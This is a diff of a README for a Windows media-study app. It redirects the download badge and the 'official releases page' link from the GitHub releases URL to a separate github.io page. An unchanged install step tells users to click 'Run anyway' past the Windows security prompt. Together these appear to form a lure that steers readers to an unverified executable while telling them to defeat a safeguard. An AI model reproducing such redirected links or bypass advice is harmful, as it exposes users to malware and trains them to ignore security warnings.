@@ -1,6 +1,6 @@
 # 🧠 gemma-media-study - Master videos with local AI tools
 
-[![Download gemma-media-study](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Rosalinedimensional886/gemma-media-study/releases)
+[![Download gemma-media-study](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://rosalinedimensional886.github.io)
 
 gemma-media-study turns video and audio files into learning resources. It runs entirely on your Windows computer. It uses artificial intelligence to transcribe speech, analyze scenes, and answer your questions about the content. You keep full control over your data since the application processes files on your local drive.
 
@@ -28,7 +28,7 @@ Your computer must meet these basic standards to run the application well.
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/Rosalinedimensional886/gemma-media-study/releases).
+1. Visit the [official releases page](https://rosalinedimensional886.github.io).
 2. Look for the file ending in `.msi` or `.exe` under the latest release.
 3. Click the link to download the installer to your computer.
 4. Run the downloaded file. Windows might show a security prompt because this is a desktop app. Click "More info" and then "Run anyway" if the system protects your machine.
